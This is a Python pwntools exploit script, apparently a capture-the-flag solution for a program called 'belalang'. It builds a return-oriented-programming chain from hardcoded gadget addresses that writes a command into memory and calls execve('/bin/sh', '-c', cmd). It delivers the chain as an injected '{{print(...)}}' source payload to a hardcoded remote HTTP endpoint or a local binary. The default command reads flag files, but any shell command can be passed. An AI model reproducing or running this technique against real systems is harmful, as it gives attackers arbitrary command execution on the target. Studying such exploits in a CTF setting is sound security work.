#!/usr/bin/env python3
import argparse
import json
import urllib.request
from pwn import *

context.arch = "amd64"
context.log_level = "error"

BIN = "./belalang"
URL = "http://109.123.232.54:1345/run"

POP_RDI = 0x4665C9
POP_RSI = 0x40F6E3
POP_RDX = 0x491A72
POP_RAX = 0x635E12
SYSCALL = 0x4181682
MOV_RDI_RSI = 0x14680F0     # mov qword ptr [rdi], rsi ; ret
BINSH = 0x42F3796           # "/bin/sh" in the read-only segment
BSS = 0x51AD000             # writable (mapped rw-p at runtime)
DASHC = BSS                 # "-c\0"
CMD = BSS + 0x100           # command string
ARGV = BSS + 0x200          # argv array

DEPTH = 2


def wq(chain, addr, val):
    """Append a write-what-where: mov qword [addr], val."""
    chain += [POP_RDI, addr, POP_RSI, val & 0xFFFFFFFFFFFFFFFF, MOV_RDI_RSI]


def build_source(cmd: bytes) -> str:
    chain = []

    # "-c\0" for argv[1]
    wq(chain, DASHC, u64(b"-c\x00\x00\x00\x00\x00\x00"))

    # command line, 8 bytes at a time
    blob = cmd + b"\x00"
    for i in range(0, len(blob), 8):
        chunk = blob[i:i + 8].ljust(8, b"\x00")
        wq(chain, CMD + i, u64(chunk))

    # argv = ["/bin/sh", "-c", cmd, NULL]
    for i, val in enumerate([BINSH, DASHC, CMD, 0]):
        wq(chain, ARGV + i * 8, val)

    # execve("/bin/sh", argv, NULL)
    chain += [
        POP_RDI, BINSH,
        POP_RSI, ARGV,
        POP_RDX, 0,
        POP_RAX, 59,
        SYSCALL,
    ]

    # args[0] = depth (guard); copied stream starts at args[DEPTH] == k=0.
    args = [DEPTH] + [0] * 26 + chain
    for v in args:
        assert 0 <= v < (1 << 63), hex(v)

    return "{{print(" + ",".join(map(str, args)) + ")}}"


def run_remote(src: str) -> str:
    req = urllib.request.Request(
        URL,
        data=json.dumps({"source": src}).encode(),
        headers={"Content-Type": "application/json"},
    )
    with urllib.request.urlopen(req, timeout=60) as resp:
        return resp.read().decode(errors="replace")


def run_local(src: str) -> str:
    path = "/tmp/belalang-pwn.bel"
    with open(path, "w") as f:
        f.write(src)
    p = process([BIN, "build", path])
    out = p.recvrepeat(3)
    p.close()
    return out.decode(errors="replace")


def main():
    ap = argparse.ArgumentParser()
    ap.add_argument("--local", action="store_true", help="run against ./belalang")
    ap.add_argument(
        "--cmd",
        default="cat flag; echo; cat /opt/belalang/src/flag",
        help="command executed by /bin/sh -c on the target",
    )
    ap.add_argument("--source", action="store_true", help="print generated .bel source")
    args = ap.parse_args()

    src = build_source(args.cmd.encode())
    if args.source:
        print(src)
        return

    out = run_local(src) if args.local else run_remote(src)
    print(out)


if __name__ == "__main__":
    main()
